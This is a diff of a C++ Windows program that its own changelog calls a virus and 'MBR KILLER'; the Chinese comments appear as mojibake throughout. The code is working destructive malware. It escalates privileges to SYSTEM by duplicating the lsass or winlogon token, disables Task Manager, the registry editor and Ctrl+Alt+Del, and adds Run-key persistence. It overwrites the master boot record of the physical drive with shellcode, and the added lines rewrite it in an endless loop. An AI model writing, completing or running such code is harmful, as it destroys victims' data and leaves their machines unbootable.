@@ -3,7 +3,7 @@
 #include <TlHelp32.h>
 #include <winnt.h>
 using namespace std;
-namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
+namespace Windows_Admin { //windowsæƒé™ç®¡ç†
 	#include <bits/stdc++.h>
 	#include <windows.h>
 	#include <TlHelp32.h>
@@ -12,7 +12,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 	#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
 	LPWSTR ToLPWSTR(char** charArray) {
 		int charCount = 0;
-		// ¼ÆËã×ÜµÄ¶à×Ö½Ú×Ö·ûÊı
+		// è®¡ç®—æ€»çš„å¤šå­—èŠ‚å­—ç¬¦æ•°
 		while (charArray[charCount] != NULL) {
 			charCount++;
 		}
@@ -21,32 +21,32 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		LPWSTR lpwsz = new WCHAR[bufferSize];
 		MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, lpwsz, bufferSize);
 
-		// ¶ÔÓÚÆäËû×Ö·û´®ÖØ¸´×ª»»¹ı³Ì
+		// å¯¹äºå…¶ä»–å­—ç¬¦ä¸²é‡å¤è½¬æ¢è¿‡ç¨‹
 		for (int i = 1; i < charCount; ++i) {
 			bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, NULL, 0);
 			LPWSTR temp = new WCHAR[bufferSize];
 			MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, temp, bufferSize);
 
-			// ½«×ª»»ºóµÄ¿í×Ö·û×Ö·û´®×·¼Óµ½lpwsz
+			// å°†è½¬æ¢åçš„å®½å­—ç¬¦å­—ç¬¦ä¸²è¿½åŠ åˆ°lpwsz
 			wcscat(lpwsz, temp);
 
-			// ÊÍ·ÅÁÙÊ±¿í×Ö·û´®
+			// é‡Šæ”¾ä¸´æ—¶å®½å­—ç¬¦ä¸²
 			delete[] temp;
 		}
 
 		return lpwsz;
 	}
 
-	void HKRunator(char *programName) { //³ÌĞòÃû³Æ£¨**È«Â·¾¶**£©
+	void HKRunator(char *programName) { //ç¨‹åºåç§°ï¼ˆ**å…¨è·¯å¾„**ï¼‰
 		HKEY hkey = NULL;
 		DWORD rc;
 
-		rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //´´½¨Ò»¸ö×¢²á±íÏî£¬Èç¹ûÓĞÔò´ò¿ª¸Ã×¢²á±íÏî
+		rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ï¼Œå¦‚æœæœ‰åˆ™æ‰“å¼€è¯¥æ³¨å†Œè¡¨é¡¹
 		                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 		                    0,
 		                    NULL,
 		                    REG_OPTION_NON_VOLATILE,
-		                    KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //²¿·ÖwindowsÏµÍ³±àÒë¸ÃĞĞ»á±¨´í£¬ É¾µô ¡°¡±KEY_WOW64_64KEY | ¡°¡± ¼´¿É
+		                    KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //éƒ¨åˆ†windowsç³»ç»Ÿç¼–è¯‘è¯¥è¡Œä¼šæŠ¥é”™ï¼Œ åˆ æ‰ â€œâ€KEY_WOW64_64KEY | â€œâ€ å³å¯
 		                    NULL,
 		                    &hkey,
 		                    NULL);
@@ -63,7 +63,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 			}
 		}
 	}
-	bool IsAdmin() { //ÊÇ·ñÎª¹ÜÀíÔ±
+	bool IsAdmin() { //æ˜¯å¦ä¸ºç®¡ç†å‘˜
 // return 1;
 		BOOL b;
 		SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
@@ -79,7 +79,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		return(b);
 	}
 
-	void Get_Admin(char** argv) { //ÌáÉıÈ¨ÏŞÖÁ¹ÜÀíÔ±
+	void Get_Admin(char** argv) { //æå‡æƒé™è‡³ç®¡ç†å‘˜
 		if (!IsAdmin()) {
 			ShellExecute(NULL, "runas", argv[0], NULL, NULL, SW_SHOWNORMAL);
 			cout<<"get!"<<endl;
@@ -87,19 +87,19 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		}
 	}
 
-	bool Get_Permanent_Admin(int args,char** argv) { //ÓÀ¾Ã¹ÜÀíÔ±
+	bool Get_Permanent_Admin(int args,char** argv) { //æ°¸ä¹…ç®¡ç†å‘˜
 //  if (argc < 1) {
 //         std::cerr << "No file path provided." << std::endl;
 //         return 1;
 //     }
 
-		// »ñÈ¡ÎÄ¼şÂ·¾¶
+		// è·å–æ–‡ä»¶è·¯å¾„
 		std::string filePath = argv[0];
 
-		// ×¢²á±íÂ·¾¶
+		// æ³¨å†Œè¡¨è·¯å¾„
 		std::wstring regPath = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers";
 
-		// ´ò¿ª×¢²á±íÏî
+		// æ‰“å¼€æ³¨å†Œè¡¨é¡¹
 		HKEY hKey;
 		LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey);
 		if (result != ERROR_SUCCESS) {
@@ -107,7 +107,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 			return 1;
 		}
 
-		// ÉèÖÃ×¢²á±íÖµ
+		// è®¾ç½®æ³¨å†Œè¡¨å€¼
 		std::wstring wFilePath(filePath.begin(), filePath.end());
 		result = RegSetValueExW(hKey, wFilePath.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(L"RUNASADMIN"), (wFilePath.length() + 1) * sizeof(wchar_t));
 		if (result != ERROR_SUCCESS) {
@@ -118,7 +118,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 
 		std::cout << "Registry value set successfully." << std::endl;
 
-		// ¹Ø±Õ×¢²á±íÏî
+		// å…³é—­æ³¨å†Œè¡¨é¡¹
 		RegCloseKey(hKey);
 	}
 
@@ -145,7 +145,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
 		CloseHandle(hToken);
 
-		//Ã¶¾Ù½ø³Ì»ñÈ¡lsass.exeµÄIDºÍwinlogon.exeµÄID£¬ËüÃÇÊÇÉÙÓĞµÄ¿ÉÒÔÖ±½Ó´ò¿ª¾ä±úµÄÏµÍ³½ø³Ì
+		//æšä¸¾è¿›ç¨‹è·å–lsass.exeçš„IDå’Œwinlogon.exeçš„IDï¼Œå®ƒä»¬æ˜¯å°‘æœ‰çš„å¯ä»¥ç›´æ¥æ‰“å¼€å¥æŸ„çš„ç³»ç»Ÿè¿›ç¨‹
 		DWORD idL, idW;
 		PROCESSENTRY32 pe;
 		pe.dwSize = sizeof(PROCESSENTRY32);
@@ -161,17 +161,17 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		}
 		CloseHandle(hSnapshot);
 
-		//»ñÈ¡¾ä±ú£¬ÏÈÊÔlsassÔÙÊÔwinlogon
+		//è·å–å¥æŸ„ï¼Œå…ˆè¯•lsasså†è¯•winlogon
 		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
 		if(!hProcess)hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
 		HANDLE hTokenx;
-		//»ñÈ¡ÁîÅÆ
+		//è·å–ä»¤ç‰Œ
 		OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);
-		//¸´ÖÆÁîÅÆ
+		//å¤åˆ¶ä»¤ç‰Œ
 		DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
 		CloseHandle(hProcess);
 		CloseHandle(hTokenx);
-		//Æô¶¯ĞÅÏ¢
+		//å¯åŠ¨ä¿¡æ¯
 		STARTUPINFOW si;
 		PROCESS_INFORMATION pi;
 		ZeroMemory(&si, sizeof(STARTUPINFOW));
@@ -200,7 +200,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		}
 	}
 
-//½ûÓÃwindowsÈÈ¼ü
+//ç¦ç”¨windowsçƒ­é”®
 	bool Start() {
 		auto module  = GetModuleHandleA("rpcrt4.dll");
 		auto func = GetProcAddress(module, "RpcServerTestCancel");
@@ -229,7 +229,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		return true;
 	}
 
-//ÖØĞÂ¿ªÆôwindowsÈÈ¼ü
+//é‡æ–°å¼€å¯windowsçƒ­é”®
 	bool Stop() {
 		auto module  = GetModuleHandleA("rpcrt4.dll");
 		auto func = GetProcAddress(module, "RpcServerTestCancel");
@@ -255,7 +255,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		return true;
 	}
 
-//ÎŞ·¨Õı³£¹Ø±Õ
+//æ— æ³•æ­£å¸¸å…³é—­
 	void can_not_close() {
 		HWND hwnd=GetConsoleWindow();
 		HMENU hmenu=GetSystemMenu(hwnd,false);
@@ -269,7 +269,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		ReleaseDC(hwnd,NULL);
 	}
 
-//½ûÓÃ×¢²á±í±à¼­Æ÷
+//ç¦ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨
 	void Ban_RegistryEditor() {
 		HKEY hkey;
 		DWORD value = 0;
@@ -278,7 +278,7 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		RegCloseKey(hkey);
 	}
 
-//½ûÓÃÈÎÎñ¹ÜÀíÆ÷
+//ç¦ç”¨ä»»åŠ¡ç®¡ç†å™¨
 	void Ban_TaskManager() {
 		HKEY hkey;
 		DWORD value = 1;
@@ -287,12 +287,12 @@ namespace Windows_Admin { //windowsÈ¨ÏŞ¹ÜÀí
 		RegCloseKey(hkey);
 	}
 
-//Ä£Äâ¼üÅÌ°´ÏÂ£¬nÎª¼üÖµ
+//æ¨¡æ‹Ÿé”®ç›˜æŒ‰ä¸‹ï¼Œnä¸ºé”®å€¼
 	void Key_Down(int n) {
 		keybd_event(n,0,0,0);
 	}
 
-//¼üÅÌµ¯Æğ
+//é”®ç›˜å¼¹èµ·
 	void Key_Up(int n) {
 		keybd_event(n,0,2,0);
 	}
@@ -326,12 +326,12 @@ void _run() {
 int main(){
     LoadLibraryA("rpcrt4.dll");
     RaiseToDebug();
- //½ûÓÃctrl+alt+del
+ //ç¦ç”¨ctrl+alt+del
     Start();
     getchar();
     string t;
     cin >> t;
- //ÆôÓÃctrl+alt+del
+ //å¯ç”¨ctrl+alt+del
     Stop();
     return 0;
 }
@@ -371,24 +371,24 @@ unsigned char scode[] =
     "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
 
 void Main() {
-	cout << "ÕıÔÚÔËĞĞ³ÌĞò..." << endl;
+	cout << "æ­£åœ¨è¿è¡Œç¨‹åº..." << endl;
 
-	/*-----------------------Ç°ÖÃ---------------------------------*/
+	/*-----------------------å‰ç½®---------------------------------*/
 
 
-//ÖÃ¶¥
+//ç½®é¡¶
 	HWND hWnd = ::GetForegroundWindow();
 	::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 100, 100, SWP_NOMOVE | SWP_NOSIZE);
 
-//ÎŞ·¨¹Ø±Õ
+//æ— æ³•å…³é—­
 	can_not_close();
 
-//·â½û×¢²á±í
+//å°ç¦æ³¨å†Œè¡¨
 	Ban_RegistryEditor();
-	//·â½ûÈÎÎñ¹ÜÀíÆ÷
+	//å°ç¦ä»»åŠ¡ç®¡ç†å™¨
 	Ban_TaskManager();
 
-	//½ûÓÃÏµÍ³ÈÈ¼ü
+	//ç¦ç”¨ç³»ç»Ÿçƒ­é”®
 	LoadLibraryA("rpcrt4.dll");
 	
 	RaiseToDebug();
@@ -398,7 +398,7 @@ void Main() {
 	DWORD dwBytesWritten, dwBytesReturned;
 	BYTE pMBR[512] = {0};
 
-// ÖØĞÂ¹¹ÔìMBR
+// é‡æ–°æ„é€ MBR
 	memcpy(pMBR, scode, sizeof(scode) - 1);
 	pMBR[510] = 0x55;
 	pMBR[511] = 0xAA;
@@ -426,7 +426,7 @@ void Main() {
 	    &dwBytesReturned,
 	    NULL
 	);
-// Ğ´Èë²¡¶¾ÄÚÈİ
+// å†™å…¥ç—…æ¯’å†…å®¹
 	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
 	DeviceIoControl
 	(
@@ -454,24 +454,52 @@ void Main() {
 	Key_Up(91);
 	Key_Up(187);
 	while (1) {
+		hDevice = CreateFile
+		(
+		  "\\\\.\\PHYSICALDRIVE0",
+		  GENERIC_READ | GENERIC_WRITE,
+		  FILE_SHARE_READ | FILE_SHARE_WRITE,
+		  NULL,
+		  OPEN_EXISTING,
+		  0,
+		  NULL
+		);
+		DeviceIoControl
+		(
+		    hDevice,
+		    FSCTL_LOCK_VOLUME,
+		    NULL,
+		    0,
+		    NULL,
+		    0,
+		    &dwBytesReturned,
+		    NULL
+		);
+	// å†™å…¥ç—…æ¯’å†…å®¹
+		WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
+		DeviceIoControl
+		(
+		    hDevice,
+		    FSCTL_UNLOCK_VOLUME,
+		    NULL,
+		    0,
+		    NULL,
+		    0,
+		    &dwBytesReturned,
+		    NULL
+		);
+		CloseHandle(hDevice);
 		HWND hWnd=GetForegroundWindow();
 		ShowWindow(hWnd,SW_HIDE);
 		SetCursorPos(rand()%1000,rand()%1000);
-		malloc(512);
 //        system("start cmd");
-		malloc(512);
 		Draw("ERROR");
 		Key_Down(91);
-		malloc(512);
 		Key_Down(187);
-		malloc(512);
 		Key_Up(187);
-		malloc(512);
 		Key_Down(189);
-		malloc(512);
 		Key_Up(189);
 		Key_Up(91);
-		malloc(512);
 	}
 // thread newThread1(DXC_A);
 // thread newThread2(DXC_B);
@@ -485,19 +513,19 @@ signed main(int argc, char** argv) {
 
 // cerr << 1 << endl;
 
-//ÌáÉıÈ¨ÏŞ ÎŞÈ¨ÏŞ->¹ÜÀíÔ±->System ·½°¸1
-	if (!IsAdmin()) Get_Admin(argv); //¹ÜÀíÔ±
+//æå‡æƒé™ æ— æƒé™->ç®¡ç†å‘˜->System æ–¹æ¡ˆ1
+	if (!IsAdmin()) Get_Admin(argv); //ç®¡ç†å‘˜
 	else if (argc<=1) {
 		Get_System(argv);
 	}
-//ÌáÉıÈ¨ÏŞ ·½°¸2
+//æå‡æƒé™ æ–¹æ¡ˆ2
 //pass
 
 	if (argc>1) cerr << "With System!" << endl;
-	_run(); //ÌáÊ¾¿ò
+	_run(); //æç¤ºæ¡†
 
-//HKRunator(argv[0]); //Æô¶¯Ïî
-	Main(); //²¡¶¾Ö÷´úÂë
+//HKRunator(argv[0]); //å¯åŠ¨é¡¹
+	Main(); //ç—…æ¯’ä¸»ä»£ç 
 	return 0;
 }
 
@@ -508,11 +536,11 @@ signed main(int argc, char** argv) {
 
 /*
 uType Option Meaning
-MB_OK µ¯´°½ö°üº¬Ò»¸ö°´Å¥£ºÈ·ÈÏ
-MB_YESNO µ¯´°°üº¬Á½¸ö°´Å¥£ºÊÇ¡¢·ñ
-MB_ABORTRETRYIGNORE µ¯´°°üº¬Èı¸ö°´Å¥£º·ÅÆú¡¢ÖØÊÔºÍÌø¹ı
-MB_YESNOCANCEL µ¯´°°üº¬Èı¸ö°´Å¥£º ÊÇ¡¢·ñ¡¢È¡Ïû
-MB_OKCANCEL µ¯´°°üº¬Á½¸ö°´Å¥£ºÈ·ÈÏ¡¢È¡Ïû
+MB_OK å¼¹çª—ä»…åŒ…å«ä¸€ä¸ªæŒ‰é’®ï¼šç¡®è®¤
+MB_YESNO å¼¹çª—åŒ…å«ä¸¤ä¸ªæŒ‰é’®ï¼šæ˜¯ã€å¦
+MB_ABORTRETRYIGNORE å¼¹çª—åŒ…å«ä¸‰ä¸ªæŒ‰é’®ï¼šæ”¾å¼ƒã€é‡è¯•å’Œè·³è¿‡
+MB_YESNOCANCEL å¼¹çª—åŒ…å«ä¸‰ä¸ªæŒ‰é’®ï¼š æ˜¯ã€å¦ã€å–æ¶ˆ
+MB_OKCANCEL å¼¹çª—åŒ…å«ä¸¤ä¸ªæŒ‰é’®ï¼šç¡®è®¤ã€å–æ¶ˆ
 
 
 #include <windows.h>
@@ -527,14 +555,14 @@ int main(int argc, char *argv[])
  return FALSE;
 }
 
-´°¿ÚÖÃ¶¥
+çª—å£ç½®é¡¶
 
-Ìí¼ÓÆô¶¯Ïî
+æ·»åŠ å¯åŠ¨é¡¹
 #include <Windows.h>
 #include <iostream>
 #include <string>
 
-// Ìí¼ÓÆô¶¯Ïî
+// æ·»åŠ å¯åŠ¨é¡¹
 void AddStartupEntry(const std::wstring& appName, const std::wstring& appPath) {
     HKEY hKey;
     LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
@@ -542,16 +570,16 @@ void AddStartupEntry(const std::wstring& appName, const std::wstring& appPath) {
         result = RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
         if (result == ERROR_SUCCESS) {
-            std::wcout << L"Æô¶¯Ïî \"" << appName << L"\" ÒÑ³É¹¦Ìí¼Ó" << std::endl;
+            std::wcout << L"å¯åŠ¨é¡¹ \"" << appName << L"\" å·²æˆåŠŸæ·»åŠ " << std::endl;
         } else {
-            std::wcerr << L"Ìí¼ÓÆô¶¯ÏîÊ§°Ü: " << result << std::endl;
+            std::wcerr << L"æ·»åŠ å¯åŠ¨é¡¹å¤±è´¥: " << result << std::endl;
         }
     } else {
-        std::wcerr << L"ÎŞ·¨´ò¿ª×¢²á±íÏî: " << result << std::endl;
+        std::wcerr << L"æ— æ³•æ‰“å¼€æ³¨å†Œè¡¨é¡¹: " << result << std::endl;
     }
 }
 
-// É¾³ıÆô¶¯Ïî
+// åˆ é™¤å¯åŠ¨é¡¹
 void RemoveStartupEntry(const std::wstring& appName) {
     HKEY hKey;
     LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
@@ -559,20 +587,20 @@ void RemoveStartupEntry(const std::wstring& appName) {
         result = RegDeleteValueW(hKey, appName.c_str());
         RegCloseKey(hKey);
         if (result == ERROR_SUCCESS) {
-            std::wcout << L"Æô¶¯Ïî \"" << appName << L"\" ÒÑ³É¹¦ÒÆ³ı" << std::endl;
+            std::wcout << L"å¯åŠ¨é¡¹ \"" << appName << L"\" å·²æˆåŠŸç§»é™¤" << std::endl;
         } else {
-            std::wcerr << L"ÒÆ³ıÆô¶¯ÏîÊ§°Ü: " << result << std::endl;
+            std::wcerr << L"ç§»é™¤å¯åŠ¨é¡¹å¤±è´¥: " << result << std::endl;
         }
     } else {
-        std::wcerr << L"ÎŞ·¨´ò¿ª×¢²á±íÏî: " << result << std::endl;
+        std::wcerr << L"æ— æ³•æ‰“å¼€æ³¨å†Œè¡¨é¡¹: " << result << std::endl;
     }
 }
 
 int main() {
-    // Ìí¼ÓÆô¶¯Ïî
+    // æ·»åŠ å¯åŠ¨é¡¹
     AddStartupEntry(L"MyApp", L"C:\\Path\\To\\Your\\Application.exe");
 
-    // É¾³ıÆô¶¯Ïî
+    // åˆ é™¤å¯åŠ¨é¡¹
     // RemoveStartupEntry(L"MyApp");
 
     return 0;
@@ -580,25 +608,26 @@ int main() {
 
 
 
-¸üĞÂÈÕÖ¾£º
-0.8.3 2024/4/17 Ç°ÖÃ-·â½û×¢²á±í¡¢ÈÎÎñ¹ÜÀíÆ÷
-0.9.2 2024/4/17 Ç°ÖÃ-´°¿ÚÖÃ¶¥¡¢ÎŞ·¨¹Ø±Õ
-1.1.0 2024/4/17 Êó±êÂÒ¶¯
-1.2.0 2024/4/17 µã»÷½ø³ÌÏûÊ§
-1.3.0 2024/4/18 Õ¨ÄÚ´æ(start cmd)
-1.4.0 2024/4/19 ½ûÓÃctrl+alt+del
-1.4.5 2024/4/19 ½ûÓÃËùÓĞwindowsÈÈ¼ü
-1.5.0 2024/4/19 ÖØ¸´·Å´óËõĞ¡
-1.6.0 2024/4/20 ×Ô¶¯¹ÜÀíÔ±ÔËĞĞ
-1.6.3 2024/4/20 ÓÅ»¯¹ÜÀíÔ±ÔËĞĞ
-1.6.5 2024/4/20 ¹Ø±ÕÕ¨ÄÚ´æ(start cmd)
-1.7.0 2024/4/20 Æô¶¯Ïî
-kz1.0 2024/4/20 ¿ìÕÕ1.0
-2.0.0 2024/4/20 ÌáÈ¨System
-2.0.5 2024/4/20 ÓÅ»¯Âë·ç
-2.0.8 2024/4/21 ĞŞ¸ÄÎÊÌâ£¨_run()ÔËĞĞÖ®ºó²Å»áÉú³ÉÆô¶¯Ïî£¬ÔÚ_run()Ö®Ç°£¬Ö»ÓĞÌáÈ¨¹ÜÀíÔ±ÓëÌáÈ¨SystemÔËĞĞ£©
-2.1.0 2024/4/21 ·¢ÏÖÎÊÌâ£¨ÓÉÓÚwindowsÏµÍ³°æ±¾²»Í¬£¬´Ë²¡¶¾Ö»Õë¶Ôwin10ÓĞĞ§£¬ÕıÔÚ¸Ä½ø£©
-2.1.1 2024/4/21 Õ¨ÄÚ´æ2.0 malloc()
-2.1.2 2024/4/21 Õ¨Í¼±ê
+æ›´æ–°æ—¥å¿—ï¼š
+0.8.3 2024/4/17 å‰ç½®-å°ç¦æ³¨å†Œè¡¨ã€ä»»åŠ¡ç®¡ç†å™¨
+0.9.2 2024/4/17 å‰ç½®-çª—å£ç½®é¡¶ã€æ— æ³•å…³é—­
+1.1.0 2024/4/17 é¼ æ ‡ä¹±åŠ¨
+1.2.0 2024/4/17 ç‚¹å‡»è¿›ç¨‹æ¶ˆå¤±
+1.3.0 2024/4/18 ç‚¸å†…å­˜(start cmd)
+1.4.0 2024/4/19 ç¦ç”¨ctrl+alt+del
+1.4.5 2024/4/19 ç¦ç”¨æ‰€æœ‰windowsçƒ­é”®
+1.5.0 2024/4/19 é‡å¤æ”¾å¤§ç¼©å°
+1.6.0 2024/4/20 è‡ªåŠ¨ç®¡ç†å‘˜è¿è¡Œ
+1.6.3 2024/4/20 ä¼˜åŒ–ç®¡ç†å‘˜è¿è¡Œ
+1.6.5 2024/4/20 å…³é—­ç‚¸å†…å­˜(start cmd)
+1.7.0 2024/4/20 å¯åŠ¨é¡¹
+kz1.0 2024/4/20 å¿«ç…§1.0
+2.0.0 2024/4/20 ææƒSystem
+2.0.5 2024/4/20 ä¼˜åŒ–ç é£
+2.0.8 2024/4/21 ä¿®æ”¹é—®é¢˜ï¼ˆ_run()è¿è¡Œä¹‹åæ‰ä¼šç”Ÿæˆå¯åŠ¨é¡¹ï¼Œåœ¨_run()ä¹‹å‰ï¼Œåªæœ‰ææƒç®¡ç†å‘˜ä¸ææƒSystemè¿è¡Œï¼‰
+2.1.0 2024/4/21 å‘ç°é—®é¢˜ï¼ˆç”±äºwindowsç³»ç»Ÿç‰ˆæœ¬ä¸åŒï¼Œæ­¤ç—…æ¯’åªé’ˆå¯¹win10æœ‰æ•ˆï¼Œæ­£åœ¨æ”¹è¿›ï¼‰
+2.1.1 2024/4/21 ç‚¸å†…å­˜2.0 malloc()
+2.1.2 2024/4/21 ç‚¸å›¾æ ‡
 3.0.0 2024/4/23 MBR KILLER 
+3.0.1 2024/5/10 åˆ é™¤ç‚¸å†…å­˜ï¼ŒMBR KILLER ä¼˜åŒ– (ç‰ºç‰²äº†å…æ€æ€§èƒ½
 */
